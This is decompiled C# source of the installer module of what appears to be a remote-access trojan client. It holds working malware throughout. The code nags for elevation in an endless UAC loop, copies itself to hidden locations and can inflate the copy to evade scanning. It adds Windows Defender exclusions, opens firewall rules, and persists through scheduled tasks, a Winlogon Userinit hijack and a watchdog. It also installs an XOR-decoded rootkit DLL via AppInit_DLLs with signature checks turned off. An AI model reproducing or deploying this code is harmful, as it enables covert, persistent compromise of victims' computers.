using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using Microsoft.Win32;

namespace Client.Helper
{
	// Token: 0x0200000C RID: 12
	internal class Install
	{
		// Token: 0x06000039 RID: 57 RVA: 0x00003DA8 File Offset: 0x00001FA8
		public static void Run()
		{
			if (Config.UseInstallAdmin == EncryptString.Decode("true") && Config.Privilege == EncryptString.Decode("User"))
			{
				if (Install.TaskCheck(Config.TaskClient) && File.Exists(Config.PathClient))
				{
					Install.RunTask(Config.TaskClient);
					Methods.Exit();
				}
				if (Config.InstallWatchDog != EncryptString.Decode("false") && Install.TaskCheck(Config.TaskWatchDog) && File.Exists(Config.PathWatchDog))
				{
					Install.RunTask(Config.TaskClient);
					Methods.Exit();
				}
				for (;;)
				{
					ProcessStartInfo processStartInfo = new ProcessStartInfo(Methods.GetExecutablePath());
					processStartInfo.Verb = EncryptString.Decode("runas");
					try
					{
						Process.Start(processStartInfo);
						Methods.Exit();
					}
					catch
					{
						continue;
					}
				}
			}
			if (Config.InstallWatchDog == EncryptString.Decode("true") && Methods.GetExecutablePath() == Config.PathWatchDog)
			{
				Install.Loop();
			}
			if (Config.PathClient != Methods.GetExecutablePath())
			{
				Install.Loop();
			}
			new Thread(delegate()
			{
				Install.Loop();
			}).Start();
		}

		// Token: 0x0600003A RID: 58 RVA: 0x00003F10 File Offset: 0x00002110
		public static void CopyFile(string sourceFilePath, string destinationFilePath)
		{
			using (FileStream fileStream = new FileStream(sourceFilePath, FileMode.Open, FileAccess.Read))
			{
				using (FileStream fileStream2 = new FileStream(destinationFilePath, FileMode.Create, FileAccess.Write))
				{
					byte[] array = new byte[1024];
					int count;
					while ((count = fileStream.Read(array, 0, array.Length)) > 0)
					{
						fileStream2.Write(array, 0, count);
					}
					if (Config.Pump == EncryptString.Decode("true"))
					{
						fileStream2.SetLength(fileStream2.Length + (long)(new Random().Next(700, 750) * 1024 * 1024));
					}
				}
			}
		}

		// Token: 0x0600003B RID: 59 RVA: 0x00003FDC File Offset: 0x000021DC
		public static void Loop()
		{
			while (Install.Installing)
			{
				if (!Directory.Exists(Path.GetDirectoryName(Config.PathClient)))
				{
					Directory.CreateDirectory(Path.GetDirectoryName(Config.PathClient));
				}
				if (!File.Exists(Config.PathClient))
				{
					Install.CopyFile(Methods.GetExecutablePath(), Config.PathClient);
					if (Config.ExclusionWD != EncryptString.Decode("false"))
					{
						WindowsDefenderExclusion.Exc(Config.PathClient);
					}
					Install.netSh(Config.PathClient, EncryptString.Decode("WindowsControl"));
				}
				Install.Schtasks(Config.PathClient, Config.TaskClient, 1);
				if (Convert.ToBoolean(Config.UserInit))
				{
					Install.UserINIT(Config.PathClient);
				}
				if (Config.HiddenFile != EncryptString.Decode("false"))
				{
					SecrityHidden.HiddenFile(Config.PathClient);
				}
				if (Config.InstallWatchDog == EncryptString.Decode("true"))
				{
					if (!Directory.Exists(Path.GetDirectoryName(Config.PathWatchDog)))
					{
						Directory.CreateDirectory(Path.GetDirectoryName(Config.PathWatchDog));
					}
					if (!File.Exists(Config.PathWatchDog))
					{
						Install.CopyFile(Methods.GetExecutablePath(), Config.PathWatchDog);
						if (Config.ExclusionWD == EncryptString.Decode("true"))
						{
							WindowsDefenderExclusion.Exc(Config.PathWatchDog);
						}
					}
					Install.Schtasks(Config.PathWatchDog, Config.TaskWatchDog, 30);
					if (Config.HiddenFile == EncryptString.Decode("true"))
					{
						SecrityHidden.HiddenFile(Config.PathWatchDog);
					}
					if (Methods.GetExecutablePath() == Config.PathWatchDog)
					{
						Methods.Exit();
					}
				}
				if (Config.RootKit != EncryptString.Decode("false") && Config.Privilege == EncryptString.Decode("Admin"))
				{
					string path = Methods.GetPath(EncryptString.Decode("%Windows%\\xdwd.dll"));
					if (!File.Exists(path))
					{
						File.WriteAllBytes(path, Xor.DecodEncod(Methods.GetResourceFile(Config.RootKit), Encoding.ASCII.GetBytes(Config.Key)));
						if (Config.HiddenFile == EncryptString.Decode("true"))
						{
							SecrityHidden.HiddenFile(path);
						}
						if (Config.ExclusionWD == EncryptString.Decode("true"))
						{
							WindowsDefenderExclusion.Exc(path);
						}
						Install.AddRootkit(path);
					}
				}
				if (Config.PathClient != Methods.GetExecutablePath())
				{
					ProcessStartInfo processStartInfo = new ProcessStartInfo();
					processStartInfo.FileName = Config.PathClient;
					if (Config.Privilege == EncryptString.Decode("Admin"))
					{
						processStartInfo.Verb = EncryptString.Decode("runas");
					}
					new Process
					{
						StartInfo = processStartInfo
					}.Start();
					Methods.Exit();
				}
				if (!MutexControl.createdNew && Mutex.OpenExisting(Config.Mutex) != null)
				{
					Methods.Exit();
				}
				Thread.Sleep(5000);
			}
		}

		// Token: 0x0600003C RID: 60 RVA: 0x000042D0 File Offset: 0x000024D0
		public static void RmRootkit()
		{
			using (RegistryKey localMachine = Registry.LocalMachine)
			{
				RegistryKey registryKey = localMachine.OpenSubKey(EncryptString.Decode("SOFTWARE")).OpenSubKey(EncryptString.Decode("Microsoft")).OpenSubKey(EncryptString.Decode("Windows NT")).OpenSubKey(EncryptString.Decode("CurrentVersion")).OpenSubKey(EncryptString.Decode("Windows"), true);
				registryKey.SetValue(EncryptString.Decode("AppInit_DLLs"), "");
				registryKey.SetValue(EncryptString.Decode("LoadAppInit_DLLs"), 0, RegistryValueKind.DWord);
				registryKey.SetValue(EncryptString.Decode("RequireSignedAppInit_DLLs"), 1, RegistryValueKind.DWord);
			}
			Process.Start(new ProcessStartInfo
			{
				UseShellExecute = false,
				CreateNoWindow = true,
				RedirectStandardOutput = true,
				WindowStyle = ProcessWindowStyle.Hidden,
				FileName = EncryptString.Decode("cmd"),
				Verb = EncryptString.Decode("runas"),
				Arguments = EncryptString.Decode("/C taskkill /im explorer.exe /f && TimeOut 2 && start explorer.exe")
			});
		}

		// Token: 0x0600003D RID: 61 RVA: 0x000043EC File Offset: 0x000025EC
		public static void AddRootkit(string fullpath)
		{
			using (RegistryKey localMachine = Registry.LocalMachine)
			{
				RegistryKey registryKey = localMachine.OpenSubKey(EncryptString.Decode("SOFTWARE")).OpenSubKey(EncryptString.Decode("Microsoft")).OpenSubKey(EncryptString.Decode("Windows NT")).OpenSubKey(EncryptString.Decode("CurrentVersion")).OpenSubKey(EncryptString.Decode("Windows"), true);
				if (registryKey.GetValue(EncryptString.Decode("AppInit_DLLs")) == null || !((string)registryKey.GetValue(EncryptString.Decode("AppInit_DLLs")) == fullpath))
				{
					registryKey.SetValue(EncryptString.Decode("AppInit_DLLs"), fullpath);
					registryKey.SetValue(EncryptString.Decode("LoadAppInit_DLLs"), 1, RegistryValueKind.DWord);
					registryKey.SetValue(EncryptString.Decode("RequireSignedAppInit_DLLs"), 0, RegistryValueKind.DWord);
				}
			}
		}

		// Token: 0x0600003E RID: 62 RVA: 0x000044E8 File Offset: 0x000026E8
		public static string Uninstall()
		{
			Install.Installing = false;
			Thread.Sleep(2000);
			string text = Path.GetTempFileName() + EncryptString.Decode(".bat");
			string text2 = string.Concat(new string[]
			{
				EncryptString.Decode("timeout 10 > NUL\n"),
				EncryptString.Decode("CD \""),
				Path.GetDirectoryName(Config.PathClient),
				EncryptString.Decode("\"\n"),
				EncryptString.Decode("DEL \""),
				Path.GetFileName(Config.PathClient),
				EncryptString.Decode("\" /f /q\n")
			});
			Install.DeletingTask(Config.TaskClient);
			if (Config.HiddenFile == EncryptString.Decode("true"))
			{
				SecrityHidden.Unlock(Config.PathClient);
			}
			if (Convert.ToBoolean(Config.UserInit))
			{
				Install.UserINIT(Config.PathClient);
			}
			if (Config.InstallWatchDog == EncryptString.Decode("true"))
			{
				Install.DeletingTask(Config.TaskWatchDog);
				if (Config.HiddenFile != EncryptString.Decode("false"))
				{
					SecrityHidden.Unlock(Config.PathWatchDog);
				}
				File.Delete(Config.PathWatchDog);
				text2 = string.Concat(new string[]
				{
					text2,
					EncryptString.Decode("CD \""),
					Path.GetDirectoryName(Config.PathWatchDog),
					EncryptString.Decode("\"\n"),
					EncryptString.Decode("DEL \""),
					Path.GetFileName(Config.PathWatchDog),
					EncryptString.Decode("\" /f /q\n")
				});
			}
			if (Config.RootKit != EncryptString.Decode("false"))
			{
				Install.RmRootkit();
				string path = Methods.GetPath(EncryptString.Decode("%Windows%\\xdwd.dll"));
				if (Config.HiddenFile == EncryptString.Decode("true"))
				{
					SecrityHidden.Unlock(path);
				}
				text2 = string.Concat(new string[]
				{
					text2,
					EncryptString.Decode("CD \""),
					Path.GetDirectoryName(path),
					EncryptString.Decode("\"\n"),
					EncryptString.Decode("DEL \""),
					Path.GetFileName(path),
					EncryptString.Decode("\" /f /q\n")
				});
			}
			text2 = string.Concat(new string[]
			{
				text2,
				EncryptString.Decode("CD \""),
				Path.GetDirectoryName(text),
				EncryptString.Decode("\"\n"),
				EncryptString.Decode("DEL \""),
				Path.GetFileName(text),
				EncryptString.Decode("\" /f /q\n")
			});
			File.WriteAllText(text, text2);
			return text;
		}

		// Token: 0x0600003F RID: 63 RVA: 0x0000477C File Offset: 0x0000297C
		public static void netSh(string path, string name)
		{
			if (Config.Privilege == EncryptString.Decode("User"))
			{
				return;
			}
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.FileName = EncryptString.Decode("CMD");
			processStartInfo.Arguments = EncryptString.Decode("netsh advfirewall firewall add rule name=\"" + name + "\" dir=in action=allow program=\"") + path + EncryptString.Decode("\" enable=yes & exit");
			processStartInfo.Verb = EncryptString.Decode("runas");
			new Process
			{
				StartInfo = processStartInfo
			}.Start();
		}

		// Token: 0x06000040 RID: 64 RVA: 0x00004828 File Offset: 0x00002A28
		public static bool TaskCheck(string name)
		{
			return File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), EncryptString.Decode("Tasks"), name));
		}

		// Token: 0x06000041 RID: 65 RVA: 0x00004848 File Offset: 0x00002A48
		private static void DeletingTask(string name)
		{
			if (!Install.TaskCheck(name))
			{
				return;
			}
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.FileName = EncryptString.Decode("CMD");
			processStartInfo.Arguments = EncryptString.Decode("/c schtasks /deleTe /F /Tn \"") + name + EncryptString.Decode("\" & exit");
			if (Config.Privilege == EncryptString.Decode("Admin"))
			{
				processStartInfo.Verb = EncryptString.Decode("runas");
			}
			ProcessStartInfo processStartInfo2 = processStartInfo;
			processStartInfo2.Arguments += EncryptString.Decode("& exit");
			new Process
			{
				StartInfo = processStartInfo
			}.Start();
		}

		// Token: 0x06000042 RID: 66 RVA: 0x00004910 File Offset: 0x00002B10
		public static void RunTask(string taskname)
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.FileName = EncryptString.Decode("CMD");
			processStartInfo.Arguments = EncryptString.Decode("/c schtasks /run /i /tn \"") + taskname + EncryptString.Decode("\"");
			new Process
			{
				StartInfo = processStartInfo
			}.Start();
		}

		// Token: 0x06000043 RID: 67 RVA: 0x00004988 File Offset: 0x00002B88
		private static void Schtasks(string Path, string Name, int minut)
		{
			if (Install.TaskCheck(Name))
			{
				return;
			}
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.FileName = EncryptString.Decode("cmd");
			processStartInfo.Arguments = string.Concat(new string[]
			{
				EncryptString.Decode("/c schtasks /create /f /sc minute /mo "),
				minut.ToString(),
				EncryptString.Decode(" /tn \""),
				Name,
				EncryptString.Decode("\" /tr \""),
				Path,
				EncryptString.Decode("\" ")
			});
			if (Config.Privilege == EncryptString.Decode("Admin"))
			{
				ProcessStartInfo processStartInfo2 = processStartInfo;
				processStartInfo2.Arguments += EncryptString.Decode("/RL HIGHEST ");
				processStartInfo.Verb = EncryptString.Decode("runas");
			}
			ProcessStartInfo processStartInfo3 = processStartInfo;
			processStartInfo3.Arguments += EncryptString.Decode("& exit");
			new Process
			{
				StartInfo = processStartInfo
			}.Start();
		}

		// Token: 0x06000044 RID: 68 RVA: 0x00004AA0 File Offset: 0x00002CA0
		public static bool UserINIT(string Name)
		{
			try
			{
				using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(EncryptString.Decode("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\winlogon")))
				{
					if ((string)registryKey.GetValue(EncryptString.Decode("Userinit")) == EncryptString.Decode("C:\\Windows\\System32\\userinit.exe,") + Name)
					{
						return true;
					}
				}
				using (RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey(EncryptString.Decode("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\winlogon"), true))
				{
					if ((string)registryKey2.GetValue(EncryptString.Decode("Userinit")) != EncryptString.Decode("C:\\Windows\\System32\\userinit.exe,") + Name)
					{
						registryKey2.SetValue(EncryptString.Decode("Userinit"), EncryptString.Decode("C:\\Windows\\System32\\userinit.exe,") + Name);
					}
					registryKey2.Close();
				}
			}
			catch
			{
				return false;
			}
			return true;
		}

		// Token: 0x06000045 RID: 69 RVA: 0x00004BC0 File Offset: 0x00002DC0
		public static void UserInitRemove()
		{
			using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(EncryptString.Decode("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\winlogon"), true))
			{
				registryKey.SetValue(EncryptString.Decode("Userinit"), EncryptString.Decode("C:\\Windows\\System32\\userinit.exe"));
				registryKey.Close();
			}
		}

		// Token: 0x0400002F RID: 47
		public static bool Installing = true;
	}
}
